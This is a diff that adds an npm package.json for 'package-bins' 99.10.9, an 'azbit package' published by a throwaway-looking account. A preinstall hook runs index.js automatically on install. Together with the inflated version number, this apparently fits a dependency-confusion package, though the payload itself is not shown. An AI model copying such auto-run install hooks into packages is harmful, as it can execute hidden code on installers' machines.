@@ -1,0 +1,39 @@
+{
+    "name": "package-bins",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "package-bins@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-bECdQTNXoWYHWWOeOSJ18tfiy7pPen+dv22EW4kcJm8lqqOGzAKNhSQJBf8QVdyZHiIMxJ37qivlW+oVkvB+gg==",
+        "shasum": "68d2fa8ce829b512c73bc91277e4c00cae1e412f",
+        "tarball": "https://registry.npmjs.org/package-bins/-/package-bins-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5064,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPMHGACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoHSBAAnZvxr96pGUQEQqSM1P4vPViLOOrhi5HWP8k0HfAiAv8sQnQG\r\nMLH61dVEkWdbi4AbW/Qy8GNholPSqXKAc8pdRDnRDvtfNAa7aZ2SwtzXEVII\r\nbj9OeTZArkbURV4IAgfzNl9HauHbu5Qr8GjXPN1PNR1zgI75CSMFCFpLoWLA\r\na5tiojBY0NmIqkJL9eiuU8eEY9GkAb2w0g33kAYj8jtzTwu4vZJDw2mDvs7Y\r\nti3RD/Gtkdyndj6KB8MKOxEpfNx506xp7IjSj0k3+SeWPCEB+u68mnEJ5wVD\r\nsZa/yzZEiHXClb9y7lgkh3B4Xo0AGnPWDHkodUpEvz3ENo1clh+ESoC+tNPv\r\nW8FJfWDCnbBEMBcbQ6a/QBgmw8pIxIEPmikhNzp1zecTZjXTLwrGpN7w49e3\r\njz2gtG/jdVLZOF0YpIKqc4X5TcmS7kvCTreO1C+w6qn9X9E0XymSzL8bblXO\r\n4NSOOfAhYVER1PMm9yokRhSRj1BZfHNKyoF1kmDm8oPTJzvGLRTK8G/wKpY5\r\neEEjLtmddjdcceE9n4LqV4Ri3DfP7O015IrmoaPdXCsABItz50VbikCKEBij\r\nAr2as+aOiqDYcBiBRRia8ps9XwXhESNvvBB1PRiz3KaMlKT/nkn9iUsgHt+4\r\njCMVHoLSC1R91QRATdMANhIKXxI7E6JWnGA=\r\n=mOGL\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "vvg226qx",
+        "email": "vvg226qx@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "vvg226qx",
+            "email": "vvg226qx@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/package-bins_99.10.9_1648148934379_0.9549556760182418"
+    },
+    "_hasShrinkwrap": false
+}
